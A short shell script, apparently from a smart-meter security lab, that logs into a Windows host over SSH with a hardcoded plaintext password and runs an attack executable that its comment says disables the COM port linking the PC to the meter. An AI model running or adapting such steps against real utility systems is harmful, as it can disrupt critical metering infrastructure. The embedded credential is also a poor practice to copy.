#!/bin/sh

# Description: This file/script demostrates the disabling of the COMPORT on the Smart Meter PC which is used to Physically interface with the Smart Meter system
# Tag: Disable COM Port   
sshpass -p 'Student12345@' ssh -o ConnectTimeout=5 student@172.16.2.223 "C:\Windows\Temp\SmartMetertest\AttackScript.exe 7"
